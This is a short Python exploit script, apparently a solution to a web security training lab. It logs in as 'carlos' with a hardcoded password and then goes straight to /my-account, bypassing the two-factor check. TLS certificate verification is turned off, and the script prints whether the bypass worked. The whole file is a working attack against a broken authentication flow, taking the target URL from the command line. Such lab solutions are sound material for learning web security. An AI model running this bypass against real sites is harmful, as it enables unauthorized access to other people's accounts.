import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def bypass(session,url):
    url_log=url+"/login"
    data={"username":"carlos","password":"montoya"}
    session.post(url_log,verify=False,data=data,allow_redirects=False)

    url_bypass=url+"/my-account"
    response=session.get(url_bypass,verify=False)
    if "Log out" in response.text:
        print('(+) By pass 2FA successfully .')
    else:
        print("(-) Error while trying to by pass 2FA ! ")


def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s www.site.com'%sys.argv[0])
        sys.exit(-1)

    url=sys.argv[1]
    session=requests.session()
    bypass(session,url)

if __name__=="__main__":
    main()